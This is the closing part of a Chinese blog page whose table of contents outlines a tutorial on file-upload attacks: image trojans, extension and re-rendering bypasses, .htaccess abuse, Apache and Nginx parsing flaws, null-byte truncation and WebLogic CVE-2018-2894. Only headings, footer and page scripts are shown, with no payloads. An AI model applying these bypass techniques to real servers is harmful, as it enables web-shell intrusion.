href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">方法一：制作图片木马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E6%96%87%E4%BB%B6%E5%B9%BB%E6%9C%AF%E2%80%93%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E8%BE%91%E5%99%A8"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">方法二：文件幻术–十六进制编辑器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E5%B1%9E%E6%80%A7%E7%89%88%E6%9C%AC-%E7%9B%B4%E6%8E%A5%E5%8A%A0%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="nav-number">2.2.2.3.</span> <span class="nav-text">方法三：属性版本 直接加一句话</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%9A010Editor-%E7%9B%B4%E6%8E%A5%E5%8A%A0%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="nav-number">2.2.2.4.</span> <span class="nav-text">方法四：010Editor 直接加一句话</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%90%8E%E7%BC%80%E5%90%8D%E2%80%93%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%AD%96%E7%95%A5"><span class="nav-number">2.2.3.</span> <span class="nav-text">3.后缀名–黑白名单策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="nav-number">2.2.4.</span> <span class="nav-text">4.二次渲染</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9Agif-%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.4.1.</span> <span class="nav-text">方法一：gif 绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Apng%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.4.2.</span> <span class="nav-text">方法二：png绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9Ajpg%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.4.3.</span> <span class="nav-text">方法三：jpg绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">2.2.5.</span> <span class="nav-text">5.条件竞争</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9ABurp-Suite-%E7%88%86%E7%A0%B4"><span class="nav-number">2.2.5.1.</span> <span class="nav-text">方法一：Burp Suite 爆破</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E8%AE%BF%E9%97%AE%E9%83%A8%E5%88%86%E5%8F%AF%E4%BD%BF%E7%94%A8-python%E8%84%9A%E6%9C%AC"><span class="nav-number">2.2.5.2.</span> <span class="nav-text">方法二：访问部分可使用 python脚本</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81-htaccess-%E6%94%BB%E5%87%BB"><span class="nav-number">3.</span> <span class="nav-text">三、.htaccess 攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-%E5%88%A9%E7%94%A8%E4%B8%80%EF%BC%9A%E5%B0%86-png-%E6%96%87%E4%BB%B6%E5%BD%93%E4%BD%9C-PHP%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 利用一：将.png 文件当作 PHP文件处理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-%E5%88%A9%E7%94%A8%E4%BA%8C%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8C%85%E5%90%AB-php-%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 利用二：文件中包含 php 关键字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-%E5%88%A9%E7%94%A8%E4%B8%89%EF%BC%9A%E5%8C%B9%E9%85%8D%E6%96%87%E4%BB%B6%E5%90%8D"><span class="nav-number">3.3.</span> <span class="nav-text">3.3 利用三：匹配文件名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-4-%E5%88%A9%E7%94%A8%E5%9B%9B%EF%BC%9A%E5%B0%86%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E9%83%BD%E5%BD%93%E4%BD%9Cphp%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86"><span class="nav-number">3.4.</span> <span class="nav-text">3.4 利用四：将所有文件后缀都当作php文件处理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81-user-ini"><span class="nav-number">4.</span> <span class="nav-text">四、.user.ini</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%94%E3%80%81Web%E5%AE%B9%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.</span> <span class="nav-text">五、Web容器解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-1-Apache-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.1.</span> <span class="nav-text">5.1 Apache 解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-1-%E5%A4%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.1.1.</span> <span class="nav-text">5.1.1 多后缀文件解析漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-2-CVE-2017-15715-%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.1.2.</span> <span class="nav-text">5.1.2 CVE-2017-15715 漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-3-x-asp-time-jpg"><span class="nav-number">5.1.3.</span> <span class="nav-text">5.1.3 x.asp&#x2F;time.jpg</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-3-PHP-CGI-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.2.</span> <span class="nav-text">5.3 PHP CGI 解析漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%AD%E3%80%81Nginx-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">6.</span> <span class="nav-text">六、Nginx 解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#6-1-Nginx-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">6.1.</span> <span class="nav-text">6.1 Nginx 解析漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-2-Nginx-%E7%A9%BA%E5%AD%97%E8%8A%82%E6%BC%8F%E6%B4%9E-%E9%9B%B6%E9%9B%B6%E6%88%AA%E6%96%AD"><span class="nav-number">6.2.</span> <span class="nav-text">6.2 Nginx 空字节漏洞(零零截断)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-3-Nginx-%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E9%9B%B6%E9%9B%B6%E6%88%AA%E6%96%AD"><span class="nav-number">6.3.</span> <span class="nav-text">6.3 Nginx 文件名逻辑漏洞(零零截断)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-4-%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-CVE-2013-4547"><span class="nav-number">6.4.</span> <span class="nav-text">6.4 文件名逻辑漏洞 (CVE-2013-4547)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0"><span class="nav-number">7.</span> <span class="nav-text">七、编辑器上传</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E9%9B%B6%E9%9B%B6%E6%88%AA%E6%96%AD"><span class="nav-number">8.</span> <span class="nav-text">八、零零截断</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#8-1-0x00%E6%88%AA%E6%96%AD%E5%8E%9F%E7%90%86"><span class="nav-number">8.1.</span> <span class="nav-text">8.1 0x00截断原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-2-URL%E4%B8%AD%E7%9A%84-00"><span class="nav-number">8.2.</span> <span class="nav-text">8.2 URL中的 %00</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-3-%E6%88%AA%E6%96%AD%E5%88%A9%E7%94%A8"><span class="nav-number">8.3.</span> <span class="nav-text">8.3 截断利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET-%E6%96%B9%E5%BC%8F%E6%8F%90%E4%BA%A4%E2%80%93%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%B0%86-00-%E8%A7%A3%E6%9E%90%E4%B8%BA-0x00-%EF%BC%8C%E5%8F%91%E6%8C%A5%E6%88%AA%E6%96%AD%E4%BD%9C%E7%94%A8"><span class="nav-number">8.3.1.</span> <span class="nav-text">GET 方式提交–会自动将 %00 解析为 0x00 ，发挥截断作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POST-%E6%96%B9%E5%BC%8F%E6%8F%90%E4%BA%A4%E2%80%93%E9%9C%80%E8%A6%81%E6%89%8B%E5%8A%A8%E5%B0%86%E5%85%B6%E8%A7%A3%E7%A0%81%E4%B8%BA-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%9A%84-00-%EF%BC%8C%E5%8F%91%E6%8C%A5%E6%88%AA%E6%96%AD%E4%BD%9C%E7%94%A8"><span class="nav-number">8.3.2.</span> <span class="nav-text">POST 方式提交–需要手动将其解码为 十六进制的 00 ，发挥截断作用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E5%AE%9E%E6%88%98"><span class="nav-number">9.</span> <span class="nav-text">九、实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#9-1-%E7%94%B1%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%BC%95%E8%B5%B7%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">9.1.</span> <span class="nav-text">9.1 由变量覆盖引起的文件上传漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-2-%E5%B8%B8%E8%A7%81-CMS-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">9.2.</span> <span class="nav-text">9.2 常见 CMS 文件上传漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-3-upload-labs-%E2%80%93-Pass-21"><span class="nav-number">9.3.</span> <span class="nav-text">9.3 upload-labs  –  Pass-21</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Pass-21"><span class="nav-number">9.3.0.1.</span> <span class="nav-text">Pass-21</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-4-Weblogic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2894%EF%BC%89"><span class="nav-number">9.4.</span> <span class="nav-text">9.4 Weblogic 任意文件上传漏洞（CVE-2018-2894）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E8%A1%A5%E5%85%85"><span class="nav-number">10.</span> <span class="nav-text">十、补充</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#10-1-FIFES"><span class="nav-number">10.1.</span> <span class="nav-text">10.1 $_FIFES</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-2-%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87"><span class="nav-number">10.2.</span> <span class="nav-text">10.2 截断绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#00%E6%88%AA%E6%96%AD%E9%98%B2%E5%BE%A1"><span class="nav-number">10.2.1.</span> <span class="nav-text">00截断防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AC%E6%8D%A2%E5%AD%97%E7%AC%A6%E9%9B%86%E9%80%A0%E6%88%90%E6%88%AA%E6%96%AD"><span class="nav-number">10.2.2.</span> <span class="nav-text">转换字符集造成截断</span></a></li></ol></li></ol></li></ol>
    
    </div>
  </aside>

</section>
        
      </div>
      
      <footer id="footer">
  

  <div class="container">
      	<div class="row">
	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
	      <p id="copyRightEn">Copyright &copy; 2013 - 2021 忆 执 昔 来 的 旅 途 All Rights Reserved.</p>
	      
	      
    		<p class="busuanzi_uv">
				UV : <span id="busuanzi_value_site_uv"></span> |  
				PV : <span id="busuanzi_value_site_pv"></span>
		    </p>
  		   
		</div>

		
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");
    var allheader = document.getElementById("allheader");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    if (allheader != null) {
      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    } else {
      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    }
</script>
    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/categories" class="mobile-nav-link">Categories</a>
  
    <a href="/tags" class="mobile-nav-link">Tags</a>
  
    <a href="/essayists" class="mobile-nav-link">Essayists</a>
  
    <a href="/playist" class="mobile-nav-link">Playist</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/scripts.js"></script>





  
<script src="/js/dialog.js"></script>









	<div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>



	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h2 class="modal-title" id="myModalLabel">设置</h2>
      </div>
      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">


      <div class="modal-body">
          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
              正文字号大小
            </a>
          </div>
          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
          <div class="panel-body">
            您已调整页面字体大小
          </div>
        </div>
      


          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
              夜间护眼模式
            </a>
        </div>
          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
          <div class="panel-body">
            夜间模式已经开启，再次单击按钮即可关闭 
          </div>
        </div>

        <div>
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
        </div>
         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
          <div class="panel-body">
            忆 执 昔 来 的 旅 途
          </div>
          <div class="panel-body">
            Copyright © 2021 xizhi-future All Rights Reserved.
          </div>
        </div>
      </div>


      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <div class="modal-footer">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
      </div>
    </div>
  </div>
</div>
  
  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
  
    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
  
</body>
</html>